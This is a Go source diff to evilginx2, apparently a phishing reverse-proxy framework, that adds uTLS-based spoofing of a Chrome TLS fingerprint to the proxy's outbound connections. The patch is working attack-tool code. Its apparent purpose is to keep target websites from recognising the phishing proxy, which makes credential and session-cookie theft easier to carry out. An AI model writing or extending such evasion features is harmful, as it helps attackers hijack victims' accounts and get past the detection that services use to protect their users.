@@ -10,6 +10,7 @@ package core
 import (
 	"bufio"
 	"bytes"
+	"context"
 	"crypto/rand"
 	"crypto/rc4"
 	"crypto/sha256"
@@ -39,6 +40,7 @@ import (
 	"github.com/go-acme/lego/v3/challenge/tlsalpn01"
 	"github.com/inconshreveable/go-vhost"
 	http_dialer "github.com/mwitkow/go-http-dialer"
+	utls "github.com/refraction-networking/utls"
 
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
@@ -139,6 +141,40 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		} else {
 			log.Info("enabled proxy: " + cfg.proxyConfig.Address + ":" + strconv.Itoa(cfg.proxyConfig.Port))
 		}
+	}
+
+	// uTLS Fingerprint spoofing setup
+	p.Proxy.Tr.DialTLSContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
+		// Use the configured dialer if a proxy is set, otherwise use the default dialer
+		var tcpConn net.Conn
+		var err error
+		if p.Proxy.Tr.Dial != nil {
+			tcpConn, err = p.Proxy.Tr.Dial(network, addr)
+		} else {
+			dialer := &net.Dialer{
+				Timeout:   30 * time.Second,
+				KeepAlive: 30 * time.Second,
+			}
+			tcpConn, err = dialer.DialContext(ctx, network, addr)
+		}
+		
+		if err != nil {
+			return nil, err
+		}
+
+		host, _, err := net.SplitHostPort(addr)
+		if err != nil {
+			host = addr
+		}
+
+		// Use uTLS to spoof a Chrome client fingerprint
+		uConn := utls.UClient(tcpConn, &utls.Config{ServerName: host}, utls.HelloChrome_Auto)
+		if err := uConn.HandshakeContext(ctx); err != nil {
+			tcpConn.Close()
+			return nil, err
+		}
+
+		return uConn, nil
 	}
 
 	p.cookieName = strings.ToLower(GenRandomString(8)) // TODO: make cookie name identifiable
